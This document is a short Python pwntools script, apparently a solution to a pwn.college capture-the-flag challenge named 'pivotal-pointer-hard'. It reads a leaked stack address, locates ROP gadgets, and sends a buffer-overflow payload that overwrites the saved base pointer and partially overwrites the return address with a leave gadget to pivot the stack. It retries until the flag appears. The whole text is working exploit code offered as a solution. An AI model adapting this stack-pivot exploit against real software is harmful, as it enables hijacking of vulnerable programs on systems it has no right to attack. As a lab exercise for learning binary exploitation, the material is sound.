#!/usr/bin/python3

import time
from pwn import *
import re

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/pivotal-pointer-hard')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop_elf = ROP(elf)


rbp = 0x7ffd559d6330
input_start = rbp - 0x80 + 0x8
ret = rbp + 0x8
offset = ret - input_start

pop_rdi = rop_elf.find_gadget(["pop rdi","ret"]).address
pop_rbp = rop_elf.find_gadget(['pop rbp','ret']).address
pop_rsi = rop_elf.find_gadget(["pop rsi","pop r15","ret"]).address
leave = rop_elf.find_gadget(["leave","ret"]).address
ret = rop_elf.find_gadget(["ret"]).address


while 1:
    io = process()
    io.recvuntil(b"[LEAK]")
    data = io.recvline()[:-1].decode()
    match = int(re.findall(r"0x[a-f\d]+",data)[0],16)

    payload = b"a" * (offset - 8)
    payload += p64(match - 16)
    payload += p16(leave)

    io.send(payload)


    d = io.recvall().decode()
    if "pwn.college" in  d:
        print(d)
        io.close()
        break
    io.close()
